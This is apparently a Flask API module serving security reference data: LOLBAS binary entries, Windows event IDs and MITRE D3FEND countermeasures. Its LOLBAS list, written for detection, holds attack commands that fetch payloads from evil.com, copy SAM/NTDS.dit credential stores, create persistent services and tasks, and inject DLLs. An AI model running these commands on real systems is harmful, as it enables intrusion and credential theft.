"""Knowledge base reference data — LOLBAS, Windows Event IDs, MITRE D3FEND.

All data is served from embedded static datasets so no external
API key is required.  The frontend can search/filter client-side.
"""
from flask import jsonify, request
from flask_jwt_extended import jwt_required
from app.api.v1 import api_bp


# ---------------------------------------------------------------------------
# LOLBAS  — Living Off The Land Binaries, Scripts and Libraries
# ---------------------------------------------------------------------------

LOLBAS_DATA = [
    {"name": "Certutil.exe", "description": "Download files, encode/decode data, manage certificates", "category": "Download", "mitre_id": "T1105", "path": "C:\\Windows\\System32\\certutil.exe", "commands": ["certutil -urlcache -split -f http://evil.com/payload.exe out.exe", "certutil -encode input.txt encoded.b64", "certutil -decode encoded.b64 output.exe"], "detection": ["Process creation with certutil.exe and -urlcache or -encode", "Network connections from certutil.exe"], "os": "Windows"},
    {"name": "Mshta.exe", "description": "Execute .hta files or inline VBScript/JScript", "category": "Execute", "mitre_id": "T1218.005", "path": "C:\\Windows\\System32\\mshta.exe", "commands": ["mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass\"\"\")(window.close)", "mshta http://evil.com/payload.hta"], "detection": ["Process creation: mshta.exe with command-line arguments", "Network connections from mshta.exe"], "os": "Windows"},
    {"name": "Regsvr32.exe", "description": "Register/unregister OLE controls, proxy execution of DLLs", "category": "Execute", "mitre_id": "T1218.010", "path": "C:\\Windows\\System32\\regsvr32.exe", "commands": ["regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll", "regsvr32 /s malicious.dll"], "detection": ["Process creation: regsvr32.exe with /i: parameter containing URL", "Network connections from regsvr32.exe"], "os": "Windows"},
    {"name": "Rundll32.exe", "description": "Execute DLL exports, proxy execution", "category": "Execute", "mitre_id": "T1218.011", "path": "C:\\Windows\\System32\\rundll32.exe", "commands": ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"", "rundll32.exe shell32.dll,ShellExec_RunDLL \"cmd.exe\""], "detection": ["Process creation: rundll32.exe with unusual command-line arguments", "DLL loading from unusual paths"], "os": "Windows"},
    {"name": "Bitsadmin.exe", "description": "BITS jobs for file download, upload, or execution", "category": "Download", "mitre_id": "T1197", "path": "C:\\Windows\\System32\\bitsadmin.exe", "commands": ["bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\\out.exe", "bitsadmin /create 1 & bitsadmin /addfile 1 http://evil.com/file C:\\file & bitsadmin /resume 1"], "detection": ["Process creation: bitsadmin.exe with /transfer or /addfile", "BITS client event logs (Event ID 3, 59, 60, 61)"], "os": "Windows"},
    {"name": "Wmic.exe", "description": "WMI command-line interface for system enumeration, process execution", "category": "Execute", "mitre_id": "T1047", "path": "C:\\Windows\\System32\\wbem\\wmic.exe", "commands": ["wmic process call create \"cmd.exe /c whoami\"", "wmic /node:target process call create \"payload.exe\"", "wmic os get caption,version"], "detection": ["Process creation: wmic.exe with process call create", "WMI activity event logs (Event ID 5857-5861)"], "os": "Windows"},
    {"name": "Msiexec.exe", "description": "Install MSI packages, proxy execution", "category": "Execute", "mitre_id": "T1218.007", "path": "C:\\Windows\\System32\\msiexec.exe", "commands": ["msiexec /q /i http://evil.com/payload.msi", "msiexec /y malicious.dll"], "detection": ["Process creation: msiexec.exe with /q and URL", "MSI installer event logs (Event ID 1033, 1034, 11707, 11724)"], "os": "Windows"},
    {"name": "Cmstp.exe", "description": "Install connection manager profiles, bypass UAC and AppLocker", "category": "Execute", "mitre_id": "T1218.003", "path": "C:\\Windows\\System32\\cmstp.exe", "commands": ["cmstp.exe /ni /s malicious.inf"], "detection": ["Process creation: cmstp.exe with /ni /s parameters", "Unusual DLL loads from cmstp.exe"], "os": "Windows"},
    {"name": "InstallUtil.exe", "description": ".NET utility for installation/uninstallation, proxy execution", "category": "Execute", "mitre_id": "T1218.004", "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe", "commands": ["InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll"], "detection": ["Process creation: InstallUtil.exe with /U flag", ".NET assembly loading from unusual paths"], "os": "Windows"},
    {"name": "Esentutl.exe", "description": "Database utility for copying locked files (e.g., SAM, NTDS.dit)", "category": "Copy", "mitre_id": "T1003.003", "path": "C:\\Windows\\System32\\esentutl.exe", "commands": ["esentutl.exe /y C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\ntds.dit /o", "esentutl.exe /y C:\\Windows\\System32\\config\\SAM /d C:\\temp\\SAM /o"], "detection": ["Process creation: esentutl.exe accessing sensitive files", "File access to SAM/NTDS/SECURITY hives"], "os": "Windows"},
    {"name": "Expand.exe", "description": "Extract compressed CAB files", "category": "Copy", "mitre_id": "T1140", "path": "C:\\Windows\\System32\\expand.exe", "commands": ["expand malicious.cab -F:* C:\\output\\"], "detection": ["Process creation: expand.exe from unusual parent processes"], "os": "Windows"},
    {"name": "Extrac32.exe", "description": "Extract CAB files, alternate to expand.exe", "category": "Copy", "mitre_id": "T1140", "path": "C:\\Windows\\System32\\extrac32.exe", "commands": ["extrac32 /Y /C http://evil.com/payload.cab C:\\out.exe"], "detection": ["Process creation: extrac32.exe with /Y and URL or unusual paths"], "os": "Windows"},
    {"name": "Forfiles.exe", "description": "Search for files and execute commands on results", "category": "Execute", "mitre_id": "T1202", "path": "C:\\Windows\\System32\\forfiles.exe", "commands": ["forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"cmd /c calc.exe\""], "detection": ["Process creation: forfiles.exe with /c parameter executing suspicious commands"], "os": "Windows"},
    {"name": "Pcalua.exe", "description": "Program Compatibility Assistant, proxy execution", "category": "Execute", "mitre_id": "T1202", "path": "C:\\Windows\\System32\\pcalua.exe", "commands": ["pcalua.exe -a malicious.exe", "pcalua.exe -a cmd.exe -c \"whoami\""], "detection": ["Process creation: pcalua.exe with -a parameter"], "os": "Windows"},
    {"name": "Sc.exe", "description": "Service Control — create, start, stop, query Windows services", "category": "Execute", "mitre_id": "T1543.003", "path": "C:\\Windows\\System32\\sc.exe", "commands": ["sc create EvilSvc binPath= \"cmd.exe /c payload.exe\" start= auto", "sc \\\\target create RemoteSvc binPath= C:\\payload.exe"], "detection": ["Process creation: sc.exe with create or config", "Service creation event logs (Event ID 7045, 4697)"], "os": "Windows"},
    {"name": "Schtasks.exe", "description": "Schedule tasks for persistence or lateral movement", "category": "Execute", "mitre_id": "T1053.005", "path": "C:\\Windows\\System32\\schtasks.exe", "commands": ["schtasks /create /tn EvilTask /tr C:\\payload.exe /sc onlogon", "schtasks /create /s target /tn RemoteTask /tr C:\\payload.exe /sc once /st 12:00"], "detection": ["Process creation: schtasks.exe with /create", "Scheduled task creation event logs (Event ID 4698, 106)"], "os": "Windows"},
    {"name": "Cscript.exe", "description": "Windows Script Host — execute VBScript/JScript", "category": "Execute", "mitre_id": "T1059.005", "path": "C:\\Windows\\System32\\cscript.exe", "commands": ["cscript //nologo malicious.vbs", "cscript //E:jscript payload.js"], "detection": ["Process creation: cscript.exe with unusual script paths", "Script Block Logging (Event ID 4104)"], "os": "Windows"},
    {"name": "Wscript.exe", "description": "Windows Script Host GUI — execute VBScript/JScript", "category": "Execute", "mitre_id": "T1059.005", "path": "C:\\Windows\\System32\\wscript.exe", "commands": ["wscript malicious.vbs", "wscript //E:jscript payload.js"], "detection": ["Process creation: wscript.exe with unusual script files", "Script Block Logging (Event ID 4104)"], "os": "Windows"},
    {"name": "Mavinject.exe", "description": "Inject DLL into running process", "category": "Execute", "mitre_id": "T1218.013", "path": "C:\\Windows\\System32\\mavinject.exe", "commands": ["mavinject.exe <PID> /INJECTRUNNING C:\\malicious.dll"], "detection": ["Process creation: mavinject.exe with /INJECTRUNNING", "DLL injection events"], "os": "Windows"},
    {"name": "Desktopimgdownldr.exe", "description": "Download files (part of Zoho ManageEngine)", "category": "Download", "mitre_id": "T1105", "path": "C:\\Program Files\\ManageEngine\\DesktopCentral_Agent\\", "commands": ["desktopimgdownldr.exe /url:http://evil.com/payload.exe /file:C:\\out.exe"], "detection": ["Process creation: desktopimgdownldr.exe with /url parameter"], "os": "Windows"},
]

LOLBAS_CATEGORIES = sorted(set(b["category"] for b in LOLBAS_DATA))


@api_bp.route('/knowledge-base/lolbas', methods=['GET'])
@jwt_required()
def kb_lolbas():
    """Return LOLBAS reference data with optional search/filter."""
    search = request.args.get('search', '').lower()
    category = request.args.get('category', '')

    items = LOLBAS_DATA
    if search:
        items = [b for b in items if search in b['name'].lower() or search in b['description'].lower() or search in b.get('mitre_id', '').lower()]
    if category:
        items = [b for b in items if b['category'] == category]

    return jsonify({'items': items, 'total': len(items), 'categories': LOLBAS_CATEGORIES}), 200


# ---------------------------------------------------------------------------
# Windows Event ID Knowledge Base
# ---------------------------------------------------------------------------

WINDOWS_EVENT_IDS = [
    # Authentication & Logon
    {"event_id": 4624, "description": "An account was successfully logged on", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4625, "description": "An account failed to log on", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4634, "description": "An account was logged off", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4648, "description": "A logon was attempted using explicit credentials (runas)", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4768, "description": "A Kerberos authentication ticket (TGT) was requested", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4769, "description": "A Kerberos service ticket (TGS) was requested", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4771, "description": "Kerberos pre-authentication failed", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4776, "description": "The domain controller attempted to validate credentials (NTLM)", "category": "Authentication", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    # Privilege Use
    {"event_id": 4672, "description": "Special privileges assigned to new logon (admin logon)", "category": "Privilege Use", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4673, "description": "A privileged service was called", "category": "Privilege Use", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4674, "description": "An operation was attempted on a privileged object", "category": "Privilege Use", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    # Account Management
    {"event_id": 4720, "description": "A user account was created", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4722, "description": "A user account was enabled", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4723, "description": "An attempt was made to change an account's password", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4724, "description": "An attempt was made to reset an account's password", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4725, "description": "A user account was disabled", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4726, "description": "A user account was deleted", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4728, "description": "A member was added to a security-enabled global group", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4732, "description": "A member was added to a security-enabled local group", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4735, "description": "A security-enabled local group was changed", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4740, "description": "A user account was locked out", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "critical"},
    {"event_id": 4756, "description": "A member was added to a security-enabled universal group", "category": "Account Management", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    # Lateral Movement
    {"event_id": 4688, "description": "A new process has been created", "category": "Lateral Movement", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 5140, "description": "A network share object was accessed", "category": "Lateral Movement", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 5145, "description": "A network share object was checked (detailed file share auditing)", "category": "Lateral Movement", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 4778, "description": "A session was reconnected to a Window Station (RDP)", "category": "Lateral Movement", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4779, "description": "A session was disconnected from a Window Station (RDP)", "category": "Lateral Movement", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 1149, "description": "Remote Desktop Services: User authentication succeeded", "category": "Lateral Movement", "provider": "Microsoft-Windows-TerminalServices-RemoteConnectionManager", "severity": "warning"},
    # Persistence
    {"event_id": 7045, "description": "A new service was installed in the system", "category": "Persistence", "provider": "Service Control Manager", "severity": "critical"},
    {"event_id": 4697, "description": "A service was installed in the system (Security log)", "category": "Persistence", "provider": "Microsoft-Windows-Security-Auditing", "severity": "critical"},
    {"event_id": 4698, "description": "A scheduled task was created", "category": "Persistence", "provider": "Microsoft-Windows-Security-Auditing", "severity": "critical"},
    {"event_id": 4699, "description": "A scheduled task was deleted", "category": "Persistence", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 106, "description": "Scheduled task registered", "category": "Persistence", "provider": "Microsoft-Windows-TaskScheduler", "severity": "warning"},
    {"event_id": 140, "description": "Scheduled task updated", "category": "Persistence", "provider": "Microsoft-Windows-TaskScheduler", "severity": "warning"},
    {"event_id": 141, "description": "Scheduled task deleted", "category": "Persistence", "provider": "Microsoft-Windows-TaskScheduler", "severity": "info"},
    {"event_id": 13, "description": "Registry value set (Sysmon)", "category": "Persistence", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 12, "description": "Registry object added or deleted (Sysmon)", "category": "Persistence", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    # Defense Evasion
    {"event_id": 1102, "description": "The audit log was cleared", "category": "Defense Evasion", "provider": "Microsoft-Windows-Eventlog", "severity": "critical"},
    {"event_id": 104, "description": "The event log was cleared", "category": "Defense Evasion", "provider": "Microsoft-Windows-Eventlog", "severity": "critical"},
    {"event_id": 4657, "description": "A registry value was modified", "category": "Defense Evasion", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    # PowerShell
    {"event_id": 4103, "description": "Module logging — pipeline execution details", "category": "PowerShell", "provider": "Microsoft-Windows-PowerShell", "severity": "info"},
    {"event_id": 4104, "description": "Script Block Logging — script content recorded", "category": "PowerShell", "provider": "Microsoft-Windows-PowerShell", "severity": "warning"},
    {"event_id": 400, "description": "Engine state changed from None to Available (PS started)", "category": "PowerShell", "provider": "PowerShell", "severity": "info"},
    {"event_id": 403, "description": "Engine state changed from Available to Stopped", "category": "PowerShell", "provider": "PowerShell", "severity": "info"},
    {"event_id": 800, "description": "Pipeline execution details (legacy)", "category": "PowerShell", "provider": "PowerShell", "severity": "info"},
    # Process / Sysmon
    {"event_id": 1, "description": "Process creation (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 3, "description": "Network connection (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 5, "description": "Process terminated (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 6, "description": "Driver loaded (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "warning"},
    {"event_id": 7, "description": "Image loaded (DLL) (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 8, "description": "CreateRemoteThread detected (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "critical"},
    {"event_id": 10, "description": "Process accessed (Sysmon — LSASS access etc.)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "critical"},
    {"event_id": 11, "description": "File created (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 15, "description": "FileCreateStreamHash — ADS created (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "warning"},
    {"event_id": 17, "description": "Pipe created (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 18, "description": "Pipe connected (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 22, "description": "DNS query (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "info"},
    {"event_id": 23, "description": "File Delete archived (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "warning"},
    {"event_id": 25, "description": "Process tampering (Sysmon)", "category": "Process", "provider": "Microsoft-Windows-Sysmon", "severity": "critical"},
    # Credential Access
    {"event_id": 4648, "description": "A logon was attempted using explicit credentials", "category": "Credential Access", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
    {"event_id": 4663, "description": "An attempt was made to access an object (SAM/NTDS)", "category": "Credential Access", "provider": "Microsoft-Windows-Security-Auditing", "severity": "critical"},
    {"event_id": 4656, "description": "A handle to an object was requested", "category": "Credential Access", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    # Firewall
    {"event_id": 2003, "description": "Windows Firewall setting was changed", "category": "Firewall", "provider": "Microsoft-Windows-Windows Firewall With Advanced Security", "severity": "warning"},
    {"event_id": 2004, "description": "A rule was added to the Windows Firewall exception list", "category": "Firewall", "provider": "Microsoft-Windows-Windows Firewall With Advanced Security", "severity": "warning"},
    {"event_id": 2005, "description": "A rule was modified in the Windows Firewall", "category": "Firewall", "provider": "Microsoft-Windows-Windows Firewall With Advanced Security", "severity": "warning"},
    {"event_id": 2006, "description": "A rule was deleted from the Windows Firewall", "category": "Firewall", "provider": "Microsoft-Windows-Windows Firewall With Advanced Security", "severity": "info"},
    {"event_id": 5156, "description": "The Windows Filtering Platform has permitted a connection", "category": "Firewall", "provider": "Microsoft-Windows-Security-Auditing", "severity": "info"},
    {"event_id": 5157, "description": "The Windows Filtering Platform has blocked a connection", "category": "Firewall", "provider": "Microsoft-Windows-Security-Auditing", "severity": "warning"},
]

EVENTID_CATEGORIES = sorted(set(e["category"] for e in WINDOWS_EVENT_IDS))


@api_bp.route('/knowledge-base/event-ids', methods=['GET'])
@jwt_required()
def kb_event_ids():
    """Return Windows Event ID reference data with optional search/filter."""
    search = request.args.get('search', '').lower()
    category = request.args.get('category', '')
    severity = request.args.get('severity', '')

    items = WINDOWS_EVENT_IDS
    if search:
        items = [e for e in items if search in str(e['event_id']) or search in e['description'].lower() or search in e.get('provider', '').lower()]
    if category:
        items = [e for e in items if e['category'] == category]
    if severity:
        items = [e for e in items if e['severity'] == severity]

    return jsonify({'items': items, 'total': len(items), 'categories': EVENTID_CATEGORIES}), 200


# ---------------------------------------------------------------------------
# MITRE D3FEND  — Defensive Countermeasures
# ---------------------------------------------------------------------------

D3FEND_TECHNIQUES = [
    # Harden
    {"id": "D3-AL", "name": "Application Hardening", "tactic": "Harden", "description": "Modify an application to reduce its attack surface or increase its resilience", "mitre_attack_mappings": ["T1190", "T1203", "T1211"], "examples": ["Binary code hardening", "ASLR", "DEP/NX", "Stack canaries"]},
    {"id": "D3-NI", "name": "Network Isolation", "tactic": "Harden", "description": "Configure network access controls to isolate systems and reduce lateral movement", "mitre_attack_mappings": ["T1021", "T1071", "T1570"], "examples": ["Network segmentation", "VLAN isolation", "Zero trust architecture", "Micro-segmentation"]},
    {"id": "D3-IOPR", "name": "IO Port Restriction", "tactic": "Harden", "description": "Restrict access to I/O ports to prevent unauthorized hardware access", "mitre_attack_mappings": ["T1200", "T1091"], "examples": ["USB port blocking", "COM port restrictions"]},
    {"id": "D3-MFA", "name": "Multi-factor Authentication", "tactic": "Harden", "description": "Require multiple forms of authentication to verify user identity", "mitre_attack_mappings": ["T1078", "T1110", "T1556"], "examples": ["TOTP", "Hardware tokens", "Push notifications", "Biometrics"]},
    {"id": "D3-PSEP", "name": "Privilege Separation", "tactic": "Harden", "description": "Separate system privileges to limit impact of compromise", "mitre_attack_mappings": ["T1068", "T1548"], "examples": ["Least privilege", "RBAC", "Service accounts with minimal permissions"]},
    {"id": "D3-DENCR", "name": "Disk Encryption", "tactic": "Harden", "description": "Encrypt disk volumes to protect data at rest", "mitre_attack_mappings": ["T1005", "T1025", "T1039"], "examples": ["BitLocker", "FileVault", "LUKS", "dm-crypt"]},
    {"id": "D3-FE", "name": "File Encryption", "tactic": "Harden", "description": "Encrypt individual files to protect sensitive data", "mitre_attack_mappings": ["T1005", "T1039", "T1119"], "examples": ["PGP/GPG encryption", "S/MIME", "AES file encryption"]},
    # Detect
    {"id": "D3-DA", "name": "Dynamic Analysis", "tactic": "Detect", "description": "Execute suspicious files in controlled environment to observe behavior", "mitre_attack_mappings": ["T1204", "T1059", "T1053"], "examples": ["Sandbox detonation", "Behavioral analysis", "API call monitoring"]},
    {"id": "D3-NTA", "name": "Network Traffic Analysis", "tactic": "Detect", "description": "Analyze network traffic for indicators of compromise or anomalous behavior", "mitre_attack_mappings": ["T1071", "T1095", "T1572"], "examples": ["IDS/IPS", "NetFlow analysis", "DNS monitoring", "SSL/TLS inspection"]},
    {"id": "D3-PCSV", "name": "Process Spawn Analysis", "tactic": "Detect", "description": "Monitor process creation to detect suspicious parent-child relationships", "mitre_attack_mappings": ["T1059", "T1106", "T1204"], "examples": ["Sysmon Event ID 1", "EDR process trees", "Command-line auditing"]},
    {"id": "D3-PA", "name": "Protocol Analysis", "tactic": "Detect", "description": "Analyze protocol usage for anomalous patterns or abuse", "mitre_attack_mappings": ["T1071", "T1572", "T1132"], "examples": ["DNS tunneling detection", "HTTP anomaly detection", "Protocol compliance"]},
    {"id": "D3-SICA", "name": "System Init Config Analysis", "tactic": "Detect", "description": "Monitor system initialization configuration for unauthorized changes", "mitre_attack_mappings": ["T1547", "T1037", "T1053"], "examples": ["Startup folder monitoring", "Registry run key checks", "Service monitoring"]},
    {"id": "D3-FAPA", "name": "File Access Pattern Analysis", "tactic": "Detect", "description": "Analyze file access patterns for indicators of data collection or staging", "mitre_attack_mappings": ["T1005", "T1039", "T1119"], "examples": ["UEBA file access", "Data loss prevention", "Honeypot files"]},
    {"id": "D3-FREG", "name": "File Registry Analysis", "tactic": "Detect", "description": "Analyze file creation, modification, and deletion events", "mitre_attack_mappings": ["T1112", "T1547", "T1574"], "examples": ["Registry auditing", "File integrity monitoring", "Autoruns monitoring"]},
    {"id": "D3-ANLS", "name": "Administrative Network Activity Analysis", "tactic": "Detect", "description": "Monitor administrative activities for unauthorized actions", "mitre_attack_mappings": ["T1021", "T1047", "T1028"], "examples": ["Privileged session monitoring", "PAM solutions", "Admin jump servers"]},
    {"id": "D3-UEAL", "name": "User Entity Behavior Analytics", "tactic": "Detect", "description": "Establish behavioral baselines and detect anomalies in user activities", "mitre_attack_mappings": ["T1078", "T1078.001", "T1078.002"], "examples": ["UEBA platforms", "Login anomaly detection", "Impossible travel detection"]},
    # Isolate
    {"id": "D3-EI", "name": "Execution Isolation", "tactic": "Isolate", "description": "Isolate process execution to prevent impact on the host system", "mitre_attack_mappings": ["T1059", "T1204", "T1203"], "examples": ["Application sandboxing", "Container isolation", "VM-based browser isolation"]},
    {"id": "D3-NI2", "name": "Network Containment", "tactic": "Isolate", "description": "Contain compromised systems by restricting network access", "mitre_attack_mappings": ["T1021", "T1570", "T1071"], "examples": ["EDR network quarantine", "VLAN reassignment", "Firewall isolation rules"]},
    {"id": "D3-ITF", "name": "Inbound Traffic Filtering", "tactic": "Isolate", "description": "Filter inbound network traffic to block malicious connections", "mitre_attack_mappings": ["T1190", "T1133"], "examples": ["WAF rules", "IP blocklists", "Geo-blocking", "Rate limiting"]},
    {"id": "D3-OTF", "name": "Outbound Traffic Filtering", "tactic": "Isolate", "description": "Filter outbound network traffic to prevent data exfiltration and C2", "mitre_attack_mappings": ["T1041", "T1567", "T1071"], "examples": ["Egress filtering", "Proxy enforcement", "DNS sinkholing"]},
    # Deceive
    {"id": "D3-DE", "name": "Decoy Environment", "tactic": "Deceive", "description": "Deploy decoy systems to detect and study adversary techniques", "mitre_attack_mappings": ["T1595", "T1046", "T1135"], "examples": ["Honeypots", "Honeynets", "Decoy servers", "Deception platforms"]},
    {"id": "D3-DF", "name": "Decoy File", "tactic": "Deceive", "description": "Place decoy files to detect unauthorized access", "mitre_attack_mappings": ["T1005", "T1039", "T1083"], "examples": ["Canary tokens", "Honey files", "Decoy credentials"]},
    {"id": "D3-DUC", "name": "Decoy User Credentials", "tactic": "Deceive", "description": "Plant fake credentials to detect credential theft attempts", "mitre_attack_mappings": ["T1003", "T1552", "T1558"], "examples": ["Honey accounts", "Canary tokens in password stores"]},
    # Evict
    {"id": "D3-CE", "name": "Credential Eviction", "tactic": "Evict", "description": "Revoke or rotate compromised credentials", "mitre_attack_mappings": ["T1078", "T1003", "T1558"], "examples": ["Password reset", "Token revocation", "Certificate rotation", "krbtgt reset"]},
    {"id": "D3-PE", "name": "Process Eviction", "tactic": "Evict", "description": "Terminate malicious processes and remove persistence", "mitre_attack_mappings": ["T1059", "T1543", "T1547"], "examples": ["Process termination", "Service removal", "Scheduled task deletion"]},
    {"id": "D3-FEV", "name": "File Eviction", "tactic": "Evict", "description": "Remove malicious files from compromised systems", "mitre_attack_mappings": ["T1105", "T1059", "T1204"], "examples": ["Malware removal", "Webshell cleanup", "Tool removal"]},
    # Restore
    {"id": "D3-BK", "name": "Backup & Restore", "tactic": "Restore", "description": "Recover systems and data from known good backups", "mitre_attack_mappings": ["T1486", "T1485", "T1561"], "examples": ["System image restore", "Database recovery", "Bare metal recovery"]},
    {"id": "D3-RR", "name": "Redundant Resource", "tactic": "Restore", "description": "Maintain redundant systems to ensure availability", "mitre_attack_mappings": ["T1499", "T1498"], "examples": ["Failover clusters", "Load balancers", "Geographic redundancy"]},
]

D3FEND_TACTICS = sorted(set(t["tactic"] for t in D3FEND_TECHNIQUES))


@api_bp.route('/knowledge-base/d3fend', methods=['GET'])
@jwt_required()
def kb_d3fend():
    """Return MITRE D3FEND technique reference data."""
    search = request.args.get('search', '').lower()
    tactic = request.args.get('tactic', '')
    attack_id = request.args.get('attack_id', '')

    items = D3FEND_TECHNIQUES
    if search:
        items = [t for t in items if search in t['name'].lower() or search in t['description'].lower() or search in t['id'].lower()]
    if tactic:
        items = [t for t in items if t['tactic'] == tactic]
    if attack_id:
        items = [t for t in items if attack_id in t.get('mitre_attack_mappings', [])]

    return jsonify({'items': items, 'total': len(items), 'tactics': D3FEND_TACTICS}), 200


@api_bp.route('/knowledge-base/d3fend/suggest', methods=['POST'])
@jwt_required()
def kb_d3fend_suggest():
    """Given a list of MITRE ATT&CK technique IDs, suggest D3FEND countermeasures.

    Body: { "attack_techniques": ["T1059", "T1078", ...] }
    """
    data = request.get_json() or {}
    techniques = data.get('attack_techniques', [])
    if not techniques:
        return jsonify({'error': 'bad_request', 'message': 'attack_techniques list required'}), 400

    suggestions: dict = {}
    for d3 in D3FEND_TECHNIQUES:
        matched = [t for t in techniques if t in d3.get('mitre_attack_mappings', [])]
        if matched:
            suggestions[d3['id']] = {
                **d3,
                'matched_techniques': matched,
            }

    return jsonify({
        'items': list(suggestions.values()),
        'total': len(suggestions),
        'input_techniques': techniques,
    }), 200
